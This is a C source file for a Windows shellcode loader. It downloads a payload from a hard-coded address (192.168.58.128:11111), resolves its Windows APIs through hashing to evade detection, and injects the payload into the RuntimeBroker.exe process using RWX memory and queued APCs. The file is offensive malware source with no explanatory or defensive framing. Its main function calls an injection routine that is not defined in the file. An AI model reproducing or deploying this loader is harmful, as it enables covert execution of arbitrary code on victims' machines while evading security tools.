#include <Windows.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <stdio.h>
#include "runtimeAPIhash.h"

#pragma comment(lib, "wininet.lib")

#define SHELLCODE_URL L"http://192.168.58.128:11111/minh.bin"

// Download shellcode via API hashing
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;

    FARPROC pLoadLibraryA = GetProcAddressH(GetModuleHandleA("kernel32.dll"), LoadLibraryA_Hash);

    HMODULE hWinInet = ((HMODULE(WINAPI*)(LPCSTR))pLoadLibraryA)("wininet.dll");

    if (!hWinInet) {
        //printf("[-] Failed to load wininet.dll\n");
        return FALSE;
    }

    FARPROC pInternetOpenW = GetProcAddressH(hWinInet, InternetOpenW_Hash);
    FARPROC pInternetOpenUrlW = GetProcAddressH(hWinInet, InternetOpenUrlW_Hash);
    FARPROC pInternetReadFile = GetProcAddressH(hWinInet, InternetReadFile_Hash);
    FARPROC pInternetCloseHandle = GetProcAddressH(hWinInet, InternetCloseHandle_Hash);

    if (!pInternetOpenW || !pInternetOpenUrlW || !pInternetReadFile || !pInternetCloseHandle) {
        //printf("[-] Failed to resolve required WinINet APIs\n");
        return FALSE;
    }

    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))pLoadLibraryA)("kernel32.dll");
    FARPROC pLocalAlloc = GetProcAddressH(hKernel32, LocalAlloc_Hash);
    FARPROC pLocalReAlloc = GetProcAddressH(hKernel32, LocalReAlloc_Hash);
    FARPROC pLocalFree = GetProcAddressH(hKernel32, LocalFree_Hash);

    hInternet = ((HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))pInternetOpenW)
        (L"ToQNj18AXnCi", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    hInternetFile = ((HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR))pInternetOpenUrlW)
        (hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)((LPVOID(WINAPI*)(UINT, SIZE_T))pLocalAlloc)(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {
        if (!((BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD))pInternetReadFile)(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        if (dwBytesRead == 0) {
            break;  // Reached the end of the file
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)((LPVOID(WINAPI*)(UINT, SIZE_T))pLocalAlloc)(LPTR, sSize);
        else
            pBytes = (PBYTE)((LPVOID(WINAPI*)(LPVOID, SIZE_T, UINT))pLocalReAlloc)(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternetFile)
        ((void(WINAPI*)(HINTERNET))pInternetCloseHandle)(hInternetFile);
    if (hInternet)
        ((void(WINAPI*)(HINTERNET))pInternetCloseHandle)(hInternet);
    if (pTmpBytes)
        ((VOID(WINAPI*)(LPVOID))pLocalFree)(pTmpBytes);

    //printf("[+] Shellcode downloaded (%d bytes)\n", (int)sSize);
    return bSTATE;
}

// Get RuntimeBroker.exe process ID via API hashing
BOOL GetExplorerProcessHandle(DWORD* dwProcessId, HANDLE* hProcess) {
    FARPROC pLoadLibraryA = GetProcAddressH(GetModuleHandleA("kernel32.dll"), LoadLibraryA_Hash);
    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))pLoadLibraryA)("kernel32.dll");
    if (!hKernel32) {
        //printf("Fail to load kernel32.dll\n");
        return FALSE;
    }

    FARPROC pCreateToolhelp32Snapshot = GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_Hash);
    FARPROC pProcess32First = GetProcAddressH(hKernel32, Process32First_Hash);
    FARPROC pProcess32Next = GetProcAddressH(hKernel32, Process32Next_Hash);
    FARPROC pOpenProcess = GetProcAddressH(hKernel32, OpenProcess_Hash);
    FARPROC pCloseHandle = GetProcAddressH(hKernel32, CloseHandle_Hash);

    if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next || !pOpenProcess || !pCloseHandle) {
        //printf("[-] Failed to resolve required kernel32 APIs\n");
        return FALSE;
    }

    HANDLE hSnapShot = ((HANDLE(WINAPI*)(DWORD, DWORD))pCreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        //printf("Error here 1!");
        return FALSE;
    }

    PROCESSENTRY32 Proc = { sizeof(PROCESSENTRY32) };

    if (!((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pProcess32First)(hSnapShot, &Proc)) {
        //printf("Error here 2!");
        ((BOOL(WINAPI*)(HANDLE))pCloseHandle)(hSnapShot);
        return FALSE;
    }

    do {
        if (_wcsicmp(Proc.szExeFile, L"RuntimeBroker.exe") == 0) {
            *dwProcessId = Proc.th32ProcessID;
            //printf("[+] Found RuntimeBroker.exe (PID: %d)\n", *dwProcessId);

            if (*dwProcessId == 0) {
                //printf("[-] Invalid dwProcessId (NULL)\n"); 
                continue;
            }

            *hProcess = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))pOpenProcess)(PROCESS_ALL_ACCESS, FALSE, *dwProcessId);
            if (*hProcess == NULL) {
                //printf("[-] Failed to open RuntimeBroker.exe (PID: %d). Error: %d\n", *dwProcessId, GetLastError());
                ((BOOL(WINAPI*)(HANDLE))pCloseHandle)(hSnapShot);
                return FALSE;
            }

            //printf("[+] Opened RuntimeBroker.exe process successfully! Handle: 0x%p\n", *hProcess);
            ((BOOL(WINAPI*)(HANDLE))pCloseHandle)(hSnapShot);
            return TRUE;
        }
    } while (Process32Next(hSnapShot, &Proc));

    ((BOOL(WINAPI*)(HANDLE))pCloseHandle)(hSnapShot);
    return FALSE;
}


// Inject shellcode using API hashing
BOOL InjectShellcodeViaAPC(HANDLE hProcess, DWORD dwProcessId, PBYTE pShellcode, SIZE_T sSize) {
    // Resolve API
    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))GetProcAddressH(GetModuleHandleA("kernel32.dll"), LoadLibraryA_Hash))("kernel32.dll");
    FARPROC pVirtualAllocEx = GetProcAddressH(hKernel32, VirtualAllocEx_Hash);
    FARPROC pWriteProcessMemory = GetProcAddressH(hKernel32, WriteProcessMemory_Hash);
    FARPROC pQueueUserApc = GetProcAddressH(hKernel32, QueueUserAPC_Hash);
    FARPROC pOpenThread = GetProcAddressH(hKernel32, OpenThread_Hash);

    // 1) Allocate & write shellcode
    LPVOID remoteAddr = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))pVirtualAllocEx)(
        hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ((BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))pWriteProcessMemory)(
        hProcess, remoteAddr, pShellcode, sSize, NULL);

    // 2) Snapshot thread and queue APC
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    Thread32First(hSnap, &te);
    do {
        if (te.th32OwnerProcessID == dwProcessId) {
            HANDLE hThread = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))pOpenThread)(
                THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hThread) {
                ((DWORD(WINAPI*)(PAPCFUNC, HANDLE, ULONG_PTR))pQueueUserApc)(
                    (PAPCFUNC)remoteAddr, hThread, 0);
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnap, &te));
    CloseHandle(hSnap);
    return TRUE;
}

int main() {
    BOOL InjectViaSection(HANDLE hProcess, PBYTE payload, SIZE_T payloadSize);

    FARPROC pLoadLibraryA = GetProcAddressH(GetModuleHandleA("kernel32.dll"), LoadLibraryA_Hash);
    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))pLoadLibraryA)("kernel32.dll");
    if (!hKernel32) {
        //printf("Fail to load kernel32.dll\n");;
        return FALSE;
    }

    FARPROC pCloseHandle = GetProcAddressH(hKernel32, CloseHandle_Hash);

    SIZE_T shellcodeSize = 0;
    PBYTE shellcode = NULL;

    if (!GetPayloadFromUrl(SHELLCODE_URL, &shellcode, &shellcodeSize)) return -1;

    HANDLE hProcess = NULL;
    DWORD dwProcessId = NULL;

    if (GetExplorerProcessHandle(&dwProcessId, &hProcess)) {
        if (InjectViaSection(hProcess, shellcode, shellcodeSize)) {
            printf("[+] Shellcode injected successfully!\n");
            ((BOOL(WINAPI*)(HANDLE))pCloseHandle)(hProcess);
            return TRUE;
        }
        else {
            printf("[-] Shellcode injection failed!\n");
            ((BOOL(WINAPI*)(HANDLE))pCloseHandle)(hProcess);
            return FALSE;
        }
    }
    else {
        printf("[-] Failed to find RuntimeBroker.exe process!\n");
        return FALSE;
    }

    return 0;
}
